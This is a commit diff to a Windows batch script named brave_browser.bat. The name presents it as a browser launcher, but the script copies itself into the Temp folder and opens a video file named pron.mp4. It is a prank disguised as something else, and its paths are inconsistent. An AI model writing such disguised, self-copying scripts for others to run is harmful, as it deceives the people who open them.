baa88b8f0f9dfa2826eb5b65322c21d4128747af
soulreaper71 <141745814+soulreaper71@users.noreply.github.com>
2026-05-27 23:22:42 +0530

    Fix file paths for video playback in batch script

--- brave_browser.bat
+++ brave_browser.bat
@@ -2,11 +2,11 @@
 for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
 
 if exist "%userprofile%/AppData/Local/Temp%~n0%~x0" (
-vlc %userprofile%/AppData/Local/Temp/pron.mp4
+%userprofile%/AppData/Local/Temp/pron.mp4
 pause
 
 ) else (
 copy /y %~f0 "%AppData%\Local\Temp"
-vlc %AppData%\Local\Temp\pron.mp4
+%AppData%\Local\Temp\pron.mp4
 )
 cls
